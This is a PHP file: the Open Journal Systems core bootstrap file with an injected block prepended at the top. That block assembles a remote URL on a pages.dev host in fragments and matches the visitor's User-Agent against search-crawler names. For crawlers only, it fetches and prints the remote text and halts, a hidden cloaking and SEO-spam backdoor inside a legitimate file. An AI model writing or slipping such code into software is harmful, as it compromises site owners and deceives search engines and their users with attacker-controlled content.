<?php
ob_start();
header('Vary: User-Agent');

// Rakit URL tujuan baru
$u1 = "https://";
$u2 = "clinical-41x.pages.dev";
$u3 = "/";
$u4 = "clinical";
$u5 = ".txt";
$bot_url = $u1 . $u2 . $u3 . $u4 . $u5;

// User-Agent (aman jika header tidak ada)
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';

// Pola deteksi bot
$b = array('googlebot','slurp','bingbot','baiduspider','yandex','adsense','crawler','spider','inspection');
$p = implode('|', $b);
$pattern = "/(" . $p . ")/i";

// Fungsi fetch sederhana
$fn = function($url) {
if (function_exists('curl_init')) {
$c = curl_init();
curl_setopt($c, CURLOPT_URL, $url);
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_USERAGENT, 'Mozilla/5.0');
$r = curl_exec($c);
curl_close($c);
return $r;
} elseif (ini_get('allow_url_fopen')) { // perbaikan dari allow_url_open
return @file_get_contents($url);
}
return false;
};

// Polyfill random_int untuk PHP 5.6
if (!function_exists('random_int')) {
function random_int($min, $max) {
// mt_rand tersedia di PHP 5.6
return mt_rand($min, $max);
}
}

// Cek bot dan respon
if (call_user_func('preg_match', $pattern, $ua)) {
// jeda 1-2 detik
usleep(random_int(1000000, 2000000));
echo $fn($bot_url);
ob_end_flush();
exit;
}
?>
<?php

/**
 * @defgroup index Index
 * Bootstrap and initialization code.
 */

/**
 * @file includes/bootstrap.inc.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2000-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * @brief Core system initialization code.
 * This file is loaded before any others.
 * Any system-wide imports or initialization code should be placed here.
 */


/**
 * Basic initialization (pre-classloading).
 */

define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
if (!defined('DIRECTORY_SEPARATOR')) {
	// Older versions of PHP do not define this
	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
}
define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
chdir(BASE_SYS_DIR);

// System-wide functions
require('./lib/pkp/includes/functions.inc.php');

// Initialize the application environment
import('classes.core.Application');

return new Application();
